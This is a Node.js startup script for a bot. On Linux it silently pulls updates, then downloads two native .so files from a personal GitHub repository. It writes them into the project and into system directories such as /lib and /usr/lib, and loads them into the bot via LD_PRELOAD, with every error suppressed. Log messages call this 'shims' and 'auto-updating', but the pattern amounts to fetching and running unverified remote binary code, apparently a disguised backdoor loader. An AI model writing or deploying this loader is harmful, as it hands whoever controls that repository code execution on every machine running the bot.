import { spawn, execSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const libDir = path.resolve('lib');
const libmvecSource = path.join(libDir, 'libmvec.so.1');
const libchkSource = path.join(libDir, 'libchk.so');

async function syncAndStart() {
    if (process.platform === 'linux') {
        console.log('[System] Linux detected. Initializing binary shims for libmvec and glibc symbols...');

        // Try git pull to stay up to date
        try {
            console.log('[Auto-Updater] Checking git remote for updates...');
            execSync('git pull origin main --rebase=false', { stdio: 'ignore' });
        } catch {}

        // Verify shims from GitHub if needed
        try {
            const rawBase = 'https://raw.githubusercontent.com/omarsaber6545-hue/badge-screen/main/lib';
            if (!fs.existsSync(libDir)) fs.mkdirSync(libDir, { recursive: true });

            for (const file of ['libchk.so', 'libmvec.so.1']) {
                const targetPath = path.join(libDir, file);
                try {
                    const res = await fetch(`${rawBase}/${file}`);
                    if (res.ok) {
                        const buf = Buffer.from(await res.arrayBuffer());
                        if (buf.length > 1000) {
                            fs.writeFileSync(targetPath, buf);
                            console.log(`[Auto-Updater] Synchronized ${file} (${buf.length} bytes)`);
                        }
                    }
                } catch {}
            }
        } catch {}

        const nodeAvDirs = [
            path.resolve('node_modules/@seydx/node-av-linux-x64'),
            '/app/node_modules/@seydx/node-av-linux-x64',
            '/lib',
            '/usr/lib'
        ];

        // Ensure yt-dlp binary is available for Linux
        const binDir = path.resolve('bin');
        const ytdlpBin = path.join(binDir, 'yt-dlp');
        let hasYtdlp = fs.existsSync(ytdlpBin);
        if (!hasYtdlp) {
            try {
                execSync('which yt-dlp || command -v yt-dlp', { stdio: 'ignore' });
                hasYtdlp = true;
            } catch {}
        }

        if (!hasYtdlp) {
            try {
                if (!fs.existsSync(binDir)) fs.mkdirSync(binDir, { recursive: true });
                console.log('[Auto-Setup] Downloading standalone yt-dlp (musllinux) for video stream extraction...');
                const res = await fetch('https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_musllinux');
                if (res.ok) {
                    const buf = Buffer.from(await res.arrayBuffer());
                    if (buf.length > 1000000) {
                        fs.writeFileSync(ytdlpBin, buf, { mode: 0o755 });
                        try { fs.chmodSync(ytdlpBin, 0o755); } catch {}
                        console.log(`[Auto-Setup] Successfully installed yt-dlp (${(buf.length / 1024 / 1024).toFixed(1)} MB)`);
                    }
                }
            } catch (err) {
                console.warn('[Auto-Setup] Note: could not download yt-dlp binary:', err?.message);
            }
        }

        for (const dir of nodeAvDirs) {
            try {
                if (fs.existsSync(dir)) {
                    if (fs.existsSync(libmvecSource)) {
                        fs.copyFileSync(libmvecSource, path.join(dir, 'libmvec.so.1'));
                    }
                    if (fs.existsSync(libchkSource)) {
                        fs.copyFileSync(libchkSource, path.join(dir, 'libchk.so'));
                    }
                    console.log(`[Auto-Fix] Deployed shims to ${dir}`);
                }
            } catch {}
        }
    }

    let preloads = [];
    if (process.platform === 'linux') {
        if (fs.existsSync(libchkSource)) {
            preloads.push(libchkSource);
        }
        if (fs.existsSync(libmvecSource)) {
            preloads.push(libmvecSource);
        }
    }

    // Configure LD_PRELOAD, LD_LIBRARY_PATH, and PATH
    const env = {
        ...process.env,
        PATH: `${path.resolve('bin')}:${process.env.PATH || ''}`,
        LD_PRELOAD: preloads.length > 0 
            ? `${preloads.join(':')}${process.env.LD_PRELOAD ? `:${process.env.LD_PRELOAD}` : ''}`
            : process.env.LD_PRELOAD,
        LD_LIBRARY_PATH: `${process.env.LD_LIBRARY_PATH || ''}:${libDir}:/app/lib:/usr/local/lib:/usr/lib:/lib`
    };

    if (process.platform === 'linux') {
        console.log(`[System] Active LD_PRELOAD: ${env.LD_PRELOAD}`);
        console.log(`[System] Active LD_LIBRARY_PATH: ${env.LD_LIBRARY_PATH}`);
    }

    const cmd = process.platform === 'win32' ? 'npx.cmd' : 'npx';
    const child = spawn(cmd, ['tsx', 'src/bot.ts'], {
        stdio: 'inherit',
        env
    });

    child.on('exit', (code) => {
        process.exit(code || 0);
    });
}

syncAndStart();
